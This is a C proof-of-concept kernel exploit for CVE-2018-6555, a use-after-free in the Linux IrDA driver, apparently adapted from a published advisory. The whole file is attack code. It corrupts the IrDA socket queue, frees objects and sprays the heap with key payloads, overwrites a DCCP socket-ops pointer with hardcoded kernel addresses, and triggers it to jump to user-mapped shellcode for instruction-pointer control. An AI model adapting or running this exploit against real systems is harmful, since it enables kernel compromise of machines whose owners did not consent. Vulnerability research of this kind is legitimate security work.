// a poc for ip control (ret2usr) using CVE-2018-6555, modified from SSD's exploit
// https://ssd-disclosure.com/ssd-advisory-irda-linux-driver-uaf/
// https://cdn2.hubspot.net/hubfs/2518562/beVX/bevx-Dissecting-a-17-year-old-Vitaly-Nikolenko.pdf?t=1537941151847
// Author: Lewis_Chen_, kylebot

#define _GNU_SOURCE
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/netlink.h>
#include <linux/xfrm.h>
#include <fcntl.h>
#include <sched.h>
#include <unistd.h>
#include "irda.h"
#include "libexp.h"

#define NLA_LENGTH(len)					\
		(NLA_ALIGN(sizeof(struct nlattr)) + (len))
#define NLMSG_TAIL(nmsg)						\
		((struct nlattr *) (((void *) (nmsg)) + NLMSG_ALIGN((nmsg)->nlmsg_len)))
#define NLA_DATA(nla)					\
		((void*)(((char*)(nla)) + NLA_LENGTH(0)))

#define CCID2_OPS_TX_GETSOCKETOPT 0xffffffff82500358
#define SC_LOC 0x00000000ffff8800
#define SHELLCODE "H\xb8HGFECBA@\xff\xe0"
#define CRASH_ADDR 0xffffffffdeadbeef
#define SPRAY_NUM 100

int *stage = 0;
char payload[0x60];
u64 target = CCID2_OPS_TX_GETSOCKETOPT - 4;
int fd1, fd2;

char *saddr = "1111111122222222";
char *daddr = "3333333344444444";
struct sockaddr_nl addr;
struct req_newae {
	struct nlmsghdr n;
	struct xfrm_aevent_id id;
	char buf[2048];
};
struct req_newsa {
	struct nlmsghdr n;
	struct xfrm_usersa_info xsinfo;
	char buf[2048];
};

int irda_set_ias(int fd,char *name)
{
	struct irda_ias_set set;
	int err = 0;
	memset(&set,0,sizeof(set));
	strncpy(set.irda_class_name,name,64);
	memset(&set.irda_attrib_name,'C',255);
	set.irda_attrib_type = 2;
	set.attribute.irda_attrib_octet_seq.len = 8;
	memset(&set.attribute.irda_attrib_octet_seq.octet_seq,0x41,1023);
	set.daddr = 4;
	err = setsockopt(fd,0x10a,0x2,&set,sizeof(set));
	//printf("setsockopt(SET) fd=%d  err=%d\n",fd,err);
	return err;
}

int irda_bind(int fd,u_int16_t  family,u_int8_t lsap_sel,int sir_addr,char *name)
{
	struct sockaddr_irda sa,sa1;
	int err;
	memset(&sa,0,sizeof(sa));
	sa.sir_family =family;
	sa.sir_lsap_sel = lsap_sel;
	sa.sir_addr = sir_addr;
	memcpy(&sa.sir_name,name,25);
	err = bind(fd,(struct sockaddr*)&sa,sizeof(sa));
	//printf("bind fd=%d err=%d\n",fd,err);
	return err;
}

void uaf()
{
	int fd1,fd2,fd3,fd4;
	struct sockaddr_irda sa,sa1;
	int err = 0;

	// defragment(0x60, 0x300);

	// create 4 IrDa sockets
	fd1 = socket(AF_IRDA, SOCK_STREAM, 0);
	fd2 = socket(AF_IRDA, SOCK_STREAM, 0);
	fd3 = socket(AF_IRDA, SOCK_STREAM, 0);
	fd4 = socket(AF_IRDA, SOCK_STREAM, 0);
	if (fd1 < 0 || fd2 < 0 || fd3 < 0 || fd4 < 0) {
		perror("[-] fail to create sockets\n");
		exit(-1);
	}

	// bind the first 3
	err = irda_bind(fd1, 4, 0x4a, 0x3, "c");
	if (err < 0) {
		perror("[-] fail to bind fd1\n");
		exit(err);
	}
	err = irda_bind(fd2, 4, 0x4b, 0x3, "c");
	if (err < 0) {
		perror("[-] fail to bind fd2\n");
		exit(err);
	}
	err = irda_bind(fd3, 4, 0x4c, 0x3, "c");
	if (err < 0) {
		perror("[-] fail to bind fd3\n");
		exit(err);
	}

	// reinsert the middle isa_obj to corrupt the queue
	for (int i = 0; i < 5; i++) {
		/* 0x00 means that it takes self->ias_obj */
		irda_set_ias(fd2, "\x00");
		irda_set_ias(fd3, "\x00");
	}

	// free sockets and force UAF
	// ts_fence();
	close(fd3);
	close(fd2);

	nonsense();
	// defragment(0x60, 8);// fill 8 holes

	*stage = 1;

	fprintf(stderr, "[+] Spray heap and overwrite fd3.prev\n");
	add_key_desc_spray_num(payload, SPRAY_NUM);

	fprintf(stderr, "[+] Bind 4th socket to overwrite the targetted pointer\n");
	irda_bind(fd4, 4, 0x30, 0x3, "c");
}

void prepare_trigger()
{
	struct sockaddr_in6 in;
	fd1 = socket(AF_INET6, SOCK_DCCP, IPPROTO_IP);
	memset(&in, 0, sizeof(in));
	in.sin6_family = AF_INET6;
	in.sin6_addr = in6addr_loopback;
	in.sin6_port = 0x214e;//htons(0x1000);
	int ret = bind(fd1, (struct sockaddr*)&in, sizeof(in));
	//printf("fd: %d\n", fd1);
	//printf("ret: %d\n", ret);
	ret = listen(fd1, 0x1);
	//printf("ret: %d\n", ret);
	fd2 = socket(AF_INET6, SOCK_DCCP, IPPROTO_IP);
	ret = connect(fd2, (struct sockaddr*)&in, sizeof(in));
	//printf("ret: %d\n", ret);
}

void trigger()
{
	char val[0x10];
	int len = 8;
	getsockopt(fd2, SOL_DCCP, 192, &val, &len);
}

void proc_func()
{
	while(*stage == 0);
	add_key_desc_spray_num(payload, SPRAY_NUM);
}

void context_setup(void)
{
	memset(payload, 0xcc, 88);
	((long*)payload)[1] = target;

	prepare_trigger();

	// prepare shellcode
	void *addr = umem_alloc((void *)(SC_LOC & ~(0xfff)), 0x1000);
	memcpy((void *)SC_LOC, (void *)SHELLCODE, sizeof(SHELLCODE));
	long *ptr = (long *)(SC_LOC+2);
	*ptr = CRASH_ADDR;

	stage = umem_alloc(NULL, 0x1000);
	for(int i=0; i<cpu_num*5; i++) {
		if(!clean_fork()) {
			proc_func();
			while(1);
		}
	}
}

int main(int argc,char **argv)
{
	sleep(1);
	// set_cpu(0);
	context_setup();
	uaf();
	trigger();
}
